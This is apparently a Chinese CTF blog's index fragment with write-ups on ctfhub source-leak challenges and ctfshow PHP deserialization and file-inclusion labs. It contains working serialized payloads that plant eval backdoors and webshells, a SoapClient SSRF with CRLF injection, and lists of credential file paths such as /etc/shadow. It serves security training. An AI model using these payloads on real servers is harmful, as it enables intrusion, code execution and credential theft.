","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:2","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#vim缓存"},{"categories":["web"],"content":"\r【备份文件下载】\r（网站源码） python dirsearch.py -u http://challenge-386c567a8c9e211f.sandbox.ctfhub.com:10800/ -e * （ bak文件）bak文件是备份文件，一般在原有的扩展名后添加.bak，提示说flag在index.php源码中，但我们直接在网址后添加php文件名查找时发现并未找到该文件 （vim缓存）当正常关闭vim时，缓存文件会被删除，但当vim异常退出时，缓存文件是未被删除的，我们就可以通过恢复未被处理缓存文件来获取原始文件的内容。第一次非正常退出vim时会生成一个swp文件，第二次非正常退出会生成一个swp文件，第三次非正常退出会生成一个swp文件。因此我们可以通过访问.index.php.swp来得到缓存文件 使用vim -r index.php.swp命令来恢复原文件 (.DS_Store)直接在网址后添加.DS_Store得到文件 使用cat DS_Store命令来查看文件，发现了一个txt文件 把这个文件复制下来添加到地址后得到flag ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:2","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#ds_store"},{"categories":["web"],"content":"\r【Git泄露】\r（log）利用GitHacker工具 githacker --url http://xxxxx/.git/ --output-folder result 然后进入目录进行： git log git diff 3e25d 或者 git diff HEAD^ （stash） git 泄露 .git/refs/stash stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。 先进行githacker，然后git stash list发现有stash 执行git stash apply或者git stash pop （index）直接githacker扒目录 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:3","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#git泄露"},{"categories":["web"],"content":"\r【Git泄露】\r（log）利用GitHacker工具 githacker --url http://xxxxx/.git/ --output-folder result 然后进入目录进行： git log git diff 3e25d 或者 git diff HEAD^ （stash） git 泄露 .git/refs/stash stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。 先进行githacker，然后git stash list发现有stash 执行git stash apply或者git stash pop （index）直接githacker扒目录 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:3","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#log"},{"categories":["web"],"content":"\r【Git泄露】\r（log）利用GitHacker工具 githacker --url http://xxxxx/.git/ --output-folder result 然后进入目录进行： git log git diff 3e25d 或者 git diff HEAD^ （stash） git 泄露 .git/refs/stash stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。 先进行githacker，然后git stash list发现有stash 执行git stash apply或者git stash pop （index）直接githacker扒目录 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:3","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#stash"},{"categories":["web"],"content":"\r【Git泄露】\r（log）利用GitHacker工具 githacker --url http://xxxxx/.git/ --output-folder result 然后进入目录进行： git log git diff 3e25d 或者 git diff HEAD^ （stash） git 泄露 .git/refs/stash stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。 先进行githacker，然后git stash list发现有stash 执行git stash apply或者git stash pop （index）直接githacker扒目录 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:3","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#index"},{"categories":["web"],"content":"\r【svn泄露】\r使用dvcs-ripper工具 ./rip-svn.pl -u http://challenge-4c86874278e5cd1d.sandbox.ctfhub.com:10800/.svn 然后进入工具目录下的.svn文件夹 cat wc.db 内容太多，利用搜索 cat wc.db | grep -a flag ┌──(root㉿kali)-[/home/kali/dvcs-ripper/.svn] └─# cat wc.db |grep -a flag normaldir()infinity��å~%index.htmlindex.htmlnormalfile$sha1$bf45c36a4dfb73378247a6311eac4f80f48fcb92���Á�root���X۾63▒ �����4 flag_1690618925.txt index.html index.html18925.txt 发现疑似文件，执行 curl http://challenge-4c86874278e5cd1d.sandbox.ctfhub.com:10800/flag_1690618925.txt curl http://challenge-4c86874278e5cd1d.sandbox.ctfhub.com:10800/index.html18925.txt 都返回404，根据index.html页面提示，flag在旧版本中， 在.svn中，cd pristine SVN泄露漏洞​ SVN 全称 Subversion ，是一个开放源代码的版本控制系统，Subversion 在 2000 年由 CollabNet Inc 开发，现在发展成为 Apache 软件基金会的一个项目，同样是一个丰富的开发者和用户社区的一部分。 SVN泄露漏洞验证方式：intitle:“index of/.svn” wc.db文件：用SQLiteStudio软件打开 wc.db文件，可以看到 NODES 表，遍历这个表里的每一行，就可以下载到整个项目里的代码了，而且还能得到对应的真实文件名。 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:4","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#svn泄露"},{"categories":["web"],"content":"\r【svn泄露】\r使用dvcs-ripper工具 ./rip-svn.pl -u http://challenge-4c86874278e5cd1d.sandbox.ctfhub.com:10800/.svn 然后进入工具目录下的.svn文件夹 cat wc.db 内容太多，利用搜索 cat wc.db | grep -a flag ┌──(root㉿kali)-[/home/kali/dvcs-ripper/.svn] └─# cat wc.db |grep -a flag normaldir()infinity��å~%index.htmlindex.htmlnormalfile$sha1$bf45c36a4dfb73378247a6311eac4f80f48fcb92���Á�root���X۾63▒ �����4 flag_1690618925.txt index.html index.html18925.txt 发现疑似文件，执行 curl http://challenge-4c86874278e5cd1d.sandbox.ctfhub.com:10800/flag_1690618925.txt curl http://challenge-4c86874278e5cd1d.sandbox.ctfhub.com:10800/index.html18925.txt 都返回404，根据index.html页面提示，flag在旧版本中， 在.svn中，cd pristine SVN泄露漏洞​ SVN 全称 Subversion ，是一个开放源代码的版本控制系统，Subversion 在 2000 年由 CollabNet Inc 开发，现在发展成为 Apache 软件基金会的一个项目，同样是一个丰富的开发者和用户社区的一部分。 SVN泄露漏洞验证方式：intitle:“index of/.svn” wc.db文件：用SQLiteStudio软件打开 wc.db文件，可以看到 NODES 表，遍历这个表里的每一行，就可以下载到整个项目里的代码了，而且还能得到对应的真实文件名。 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:4","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#svn泄露漏洞"},{"categories":["web"],"content":"\r【HG泄露】\r使用 dvcs-ripper 工具下载泄露的网站目录 ./rip-hg.pl -u http://challenge-137f105811083a40.sandbox.ctfhub.com:10800/.hg 使用工具过程中出现了一些错误，导致网站源代码没有完整下载。正如网页显示内容中的提示所说，不好使的情况下，试着手工解决。 ┌──(root㉿kali)-[/home/kali/dvcs-ripper] └─# tree .hg .hg ├── 00changelog.i ├── dirstate ├── last-message.txt ├── requires ├── store │ ├── 00changelog.i │ ├── 00manifest.i │ ├── data │ ├── fncache │ └── undo ├── undo.branch ├── undo.desc └── undo.dirstate 通过正则搜索flag相关的文件 然后执行curl HG泄露漏洞​ Mercurial 是一种轻量级分布式版本控制系统，采用 Python 语言实现，易于学习和使用，扩展性强。其是基于 GNU General Public License (GPL) 授权的开源项目。 在 Mercurial 轻量级分布式版本控制系统中，本地既可以当做版本库的服务端，也可以当做版本库的客户端。版本库与工作目录不同，版本库存放了所有版本，而工作目录只是因为特定需要存放特定版本。与 SVN 系统不同，SVN 的版本库集中在一台服务器中。这也导致很多初次使用 Mercurial 系统的工作者，因为操作失误导致出现 HG 泄露漏洞的主要原因。\r常规文件robots.txt：记录一些目录和CMS版本信息 readme.md：记录CMS版本信息，有的甚至是GitHub地址 www.zip/rar/tar.gz：往往是网站的备份源码 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:5","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#hg泄露"},{"categories":["web"],"content":"\r【HG泄露】\r使用 dvcs-ripper 工具下载泄露的网站目录 ./rip-hg.pl -u http://challenge-137f105811083a40.sandbox.ctfhub.com:10800/.hg 使用工具过程中出现了一些错误，导致网站源代码没有完整下载。正如网页显示内容中的提示所说，不好使的情况下，试着手工解决。 ┌──(root㉿kali)-[/home/kali/dvcs-ripper] └─# tree .hg .hg ├── 00changelog.i ├── dirstate ├── last-message.txt ├── requires ├── store │ ├── 00changelog.i │ ├── 00manifest.i │ ├── data │ ├── fncache │ └── undo ├── undo.branch ├── undo.desc └── undo.dirstate 通过正则搜索flag相关的文件 然后执行curl HG泄露漏洞​ Mercurial 是一种轻量级分布式版本控制系统，采用 Python 语言实现，易于学习和使用，扩展性强。其是基于 GNU General Public License (GPL) 授权的开源项目。 在 Mercurial 轻量级分布式版本控制系统中，本地既可以当做版本库的服务端，也可以当做版本库的客户端。版本库与工作目录不同，版本库存放了所有版本，而工作目录只是因为特定需要存放特定版本。与 SVN 系统不同，SVN 的版本库集中在一台服务器中。这也导致很多初次使用 Mercurial 系统的工作者，因为操作失误导致出现 HG 泄露漏洞的主要原因。\r常规文件robots.txt：记录一些目录和CMS版本信息 readme.md：记录CMS版本信息，有的甚至是GitHub地址 www.zip/rar/tar.gz：往往是网站的备份源码 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:5","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#hg泄露漏洞"},{"categories":["web"],"content":"\r【HG泄露】\r使用 dvcs-ripper 工具下载泄露的网站目录 ./rip-hg.pl -u http://challenge-137f105811083a40.sandbox.ctfhub.com:10800/.hg 使用工具过程中出现了一些错误，导致网站源代码没有完整下载。正如网页显示内容中的提示所说，不好使的情况下，试着手工解决。 ┌──(root㉿kali)-[/home/kali/dvcs-ripper] └─# tree .hg .hg ├── 00changelog.i ├── dirstate ├── last-message.txt ├── requires ├── store │ ├── 00changelog.i │ ├── 00manifest.i │ ├── data │ ├── fncache │ └── undo ├── undo.branch ├── undo.desc └── undo.dirstate 通过正则搜索flag相关的文件 然后执行curl HG泄露漏洞​ Mercurial 是一种轻量级分布式版本控制系统，采用 Python 语言实现，易于学习和使用，扩展性强。其是基于 GNU General Public License (GPL) 授权的开源项目。 在 Mercurial 轻量级分布式版本控制系统中，本地既可以当做版本库的服务端，也可以当做版本库的客户端。版本库与工作目录不同，版本库存放了所有版本，而工作目录只是因为特定需要存放特定版本。与 SVN 系统不同，SVN 的版本库集中在一台服务器中。这也导致很多初次使用 Mercurial 系统的工作者，因为操作失误导致出现 HG 泄露漏洞的主要原因。\r常规文件robots.txt：记录一些目录和CMS版本信息 readme.md：记录CMS版本信息，有的甚至是GitHub地址 www.zip/rar/tar.gz：往往是网站的备份源码 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:5","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#常规文件"},{"categories":["CTF","web"],"content":"ctfshow反序列化专题 PHP面向对象编程： https://www.runoob.com/php./php-oop.html ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:0:0","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#"},{"categories":["CTF","web"],"content":"\r总结：Lethe’s Blog谈一谈PHP反序列化 反序列化中常见的魔术方法： __wakeup() //执行unserialize()时，先会调用这个函数 __sleep() //执行serialize()时，先会调用这个函数 __destruct() //对象被销毁时触发 __call() //在对象上下文中调用不可访问的方法时触发 __callStatic() //在静态上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用isset()或empty()触发 __unset() //在不可访问的属性上使用unset()时触发 __toString() //把类当作字符串使用时触发 __invoke() //当尝试将对象调用为函数时触发 如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法， 则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:1:0","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#总结"},{"categories":["CTF","web"],"content":"\r靶场题目：","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:0","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#靶场题目"},{"categories":["CTF","web"],"content":"\r[web254] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 19:29:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); include('flag.php'); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public function checkVip(){ return $this-\u003eisVip; } public function login($u,$p){ if($this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p){ $this-\u003eisVip=true; } return $this-\u003eisVip; } public function vipOneKeyGetFlag(){ if($this-\u003eisVip){ global $flag; echo \"your flag is \".$flag; }else{ echo \"no vip, no flag\"; } } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ $user = new ctfShowUser(); if($user-\u003elogin($username,$password)){ if($user-\u003echeckVip()){ $user-\u003evipOneKeyGetFlag(); } }else{ echo \"no vip,no flag\"; } } GET传参 username=xxxxxx\u0026password=xxxxxx ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:1","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web254"},{"categories":["CTF","web"],"content":"\r[web255] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 19:29:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); include('flag.php'); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public function checkVip(){ return $this-\u003eisVip; } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function vipOneKeyGetFlag(){ if($this-\u003eisVip){ global $flag; echo \"your flag is \".$flag; }else{ echo \"no vip, no flag\"; } } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ $user = unserialize($_COOKIE['user']); if($user-\u003elogin($username,$password)){ if($user-\u003echeckVip()){ $user-\u003evipOneKeyGetFlag(); } }else{ echo \"no vip,no flag\"; } } 生成序列化内容 \u003c?php class ctfShowUser{ public $isVip=True; } $user = urlencode(serialize(new ctfShowUser())); echo $user; ?\u003e GET传参username和password内容，Cookie传递url编码后public $isVip=True;并序列化的参数 ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:2","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web255"},{"categories":["CTF","web"],"content":"\r[web256] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 19:29:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); include('flag.php'); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public function checkVip(){ return $this-\u003eisVip; } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function vipOneKeyGetFlag(){ if($this-\u003eisVip){ global $flag; if($this-\u003eusername!==$this-\u003epassword){ echo \"your flag is \".$flag; } }else{ echo \"no vip, no flag\"; } } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ $user = unserialize($_COOKIE['user']); if($user-\u003elogin($username,$password)){ if($user-\u003echeckVip()){ $user-\u003evipOneKeyGetFlag(); } }else{ echo \"no vip,no flag\"; } } 要求svip为true，同时username和password的值不同 思路同类似上题 ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:3","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web256"},{"categories":["CTF","web"],"content":"\r[web257] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 20:33:07 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); class ctfShowUser{ private $username='xxxxxx'; private $password='xxxxxx'; private $isVip=false; private $class = 'info'; public function __construct(){ $this-\u003eclass=new info(); } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function __destruct(){ $this-\u003eclass-\u003egetInfo(); } } class info{ private $user='xxxxxx'; public function getInfo(){ return $this-\u003euser; } } class backDoor{ private $code; public function getInfo(){ eval($this-\u003ecode); } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ $user = unserialize($_COOKIE['user']); $user-\u003elogin($username,$password); } __destruct() 是PHP面向对象编程的另一个重要的魔法函数，该函数会在类的一个对象被删除时自动调用。 我们可以在该函数中添加一些释放资源的操作，比如关闭文件、关闭数据库链接、清空一个结果集等。其实，__destruct() 在日常的编码中并不常见，因为它是非必须的，是类的可选组成部分。通常只是用来完成对象被删除时的清理动作而已。 **反序列化题目的宗旨：**不能修改类方法的代码，但可以控制类方法的属性，通过类方法的属性来执行我们需要的操作 username和password只需要存在即可 \u003c?php class ctfShowUser{ private $username='xxxxxx'; private $password='xxxxxx'; private $isVip=false; private $class = 'info'; public function __construct(){ $this-\u003eclass=new backDoor(); } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function __destruct(){ $this-\u003eclass-\u003egetInfo(); } } class info{ private $user='xxxxxx'; public function getInfo(){ return $this-\u003euser; } } class backDoor{ private $code='eval($_POST[Ki1ro]);'; public function getInfo(){ eval($this-\u003ecode); } } echo urlencode(serialize(new ctfShowUser())); ?\u003e payload： GET username=1\u0026password=2 COOKIE user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A20%3A%22eval%28%24_POST%5BKi1ro%5D%29%3B%22%3B%7D%7D ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:4","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web257"},{"categories":["CTF","web"],"content":"\r[web258] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 21:38:56 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public $class = 'info'; public function __construct(){ $this-\u003eclass=new info(); } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function __destruct(){ $this-\u003eclass-\u003egetInfo(); } } class info{ public $user='xxxxxx'; public function getInfo(){ return $this-\u003euser; } } class backDoor{ public $code; public function getInfo(){ eval($this-\u003ecode); } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){ $user = unserialize($_COOKIE['user']); } $user-\u003elogin($username,$password); } 对形如O:8进行了过滤，我们可以在数字前加上加号绕过 执行一下php代码，并通过cookie传参 \u003c?php class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=true; public $class = 'backDoor'; public function __construct(){ $this-\u003eclass=new backDoor(); } public function __destruct(){ $this-\u003eclass-\u003egetInfo(); } } class backDoor{ public $code=\"system('cat flag.php');\"; public function getInfo(){ eval($this-\u003ecode); } } $a = new ctfShowUser(); $a = serialize($a); $a= str_replace('O:', 'O:+',$a);//绕过preg_match echo urlencode($a); username和password随意 ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:5","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web258"},{"categories":["CTF","web"],"content":"\r[web259]\r\u003c?php highlight_file(__FILE__); $vip = unserialize($_GET['vip']); //vip can get flag one key $vip-\u003egetFlag(); Notice: Undefined index: vip in /var/www/html/index.php on line 6 Fatal error: Uncaught Error: Call to a member function getFlag() on bool in /var/www/html/index.php:8 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 8 这个类中有个__call魔术方法（当调用不存在的方法时触发），会调用SoapClient类的构造方法。 php的原生类SoapClient https://www.php.net/manual/en/class.soapclient.php php执行： \u003c?php $target = 'http://127.0.0.1/flag.php'; $post_string = 'token=ctfshow'; $b = new SoapClient(null,array('location' =\u003e $target,'user_agent'=\u003e'wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=\u003e \"ssrf\")); $a = serialize($b); $a = str_replace('^^',\"\\r\\n\",$a); echo urlencode($a); ?\u003e ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:6","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web259"},{"categories":["CTF","web"],"content":"\r[web260]本题考点比较单一，传入含有不间断ctfshow_i_love_36D就可以 ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:7","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web260"},{"categories":["CTF","web"],"content":"\r[web261] \u003c?php highlight_file(__FILE__); class ctfshowvip{ public $username; public $password; public $code; public function __construct($u,$p){ $this-\u003eusername=$u; $this-\u003epassword=$p; } public function __wakeup(){ if($this-\u003eusername!='' || $this-\u003epassword!=''){ die('error'); } } public function __invoke(){ eval($this-\u003ecode); } public function __sleep(){ $this-\u003eusername=''; $this-\u003epassword=''; } public function __unserialize($data){ $this-\u003eusername=$data['username']; $this-\u003epassword=$data['password']; $this-\u003ecode = $this-\u003eusername.$this-\u003epassword; } public function __destruct(){ if($this-\u003ecode==0x36d){ file_put_contents($this-\u003eusername, $this-\u003epassword); } } } unserialize($_GET['vip']); 这里面全是魔术方法 __invoke()当尝试将对象调用为函数时触发,但是这里没有相关的函数，所以这个相当于没用 __destruct()``$this-\u003ecode==0x36d是弱类型比较，0x36d没有引号代表数字，十六进制0x36d转为十进制是877,我们只要让a=877.php，b为一句话木马即可 \u003c?php class ctfshowvip{ public $username; public $password; public function __construct(){ $this-\u003eusername='877.php'; $this-\u003epassword=\"\u003c?php eval(system('tac /fl*')); ?\u003e\"; } } echo urlencode(serialize(new ctfshowvip())); ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:8","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web261"},{"categories":["CTF","web"],"content":"\r[web262] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-03 02:37:19 # @Last Modified by: h1xa # @Last Modified time: 2020-12-03 16:05:38 # @message.php # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); class message{ public $from; public $msg; public $to; public $token='user'; public function __construct($f,$m,$t){ $this-\u003efrom = $f; $this-\u003emsg = $m; $this-\u003eto = $t; } } $f = $_GET['f']; $m = $_GET['m']; $t = $_GET['t']; if(isset($f) \u0026\u0026 isset($m) \u0026\u0026 isset($t)){ $msg = new message($f,$m,$t); $umsg = str_replace('fuck', 'loveU', serialize($msg)); setcookie('msg',base64_encode($umsg)); echo 'Your message has been sent'; } highlight_file(__FILE__); 非预期解：访问message.php，得到： \u003c?php highlight_file(__FILE__); include('flag.php'); class message{ public $from; public $msg; public $to; public $token='user'; public function __construct($f,$m,$t){ $this-\u003efrom = $f; $this-\u003emsg = $m; $this-\u003eto = $t; } } if(isset($_COOKIE['msg'])){ $msg = unserialize(base64_decode($_COOKIE['msg'])); if($msg-\u003etoken=='admin'){ echo $flag; } } 发送一个值为msg的cookie，并且token=admin payload： \u003c?php class message{ public $token='admin'; } $a = serialize(new message()); echo base64_encode($a) ?\u003e ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web262"},{"categories":["CTF","web"],"content":"\r[web263]session反序列化 ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web263"},{"categories":["CTF","web"],"content":"ctfshow文件包含专题 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:0:0","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#"},{"categories":["CTF","web"],"content":"\r总结：文件包含漏洞全面详解 php文件包含函数： require():找不到被包含的文件会产生致命错误，并停止脚本运行 include():找不到被包含的文件只会产生警告，脚本继续执行 require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:0","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#总结"},{"categories":["CTF","web"],"content":"\r本地文件包含漏洞(LFI)\r常见敏感信息路径:Windows系统: C:\\boot.ini //查看系统版本 C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\windows\\repair\\sam //存储Windows系统初次安装的密码 C:\\ProgramFiles\\mysql\\my.ini //Mysql配置 C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码 C:\\windows\\php.ini //php配置信息 Linux/Unix系统: /etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。 利用条件： 对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知 以直接访问的形式来写入如访问127.0.0.1\u003c?php phpinfo();?\u003e在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码 包含Session文件利用条件： 找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径: /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径 包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#本地文件包含漏洞lfi"},{"categories":["CTF","web"],"content":"\r本地文件包含漏洞(LFI)\r常见敏感信息路径:Windows系统: C:\\boot.ini //查看系统版本 C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\windows\\repair\\sam //存储Windows系统初次安装的密码 C:\\ProgramFiles\\mysql\\my.ini //Mysql配置 C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码 C:\\windows\\php.ini //php配置信息 Linux/Unix系统: /etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。 利用条件： 对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知 以直接访问的形式来写入如访问127.0.0.1\u003c?php phpinfo();?\u003e在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码 包含Session文件利用条件： 找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径: /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径 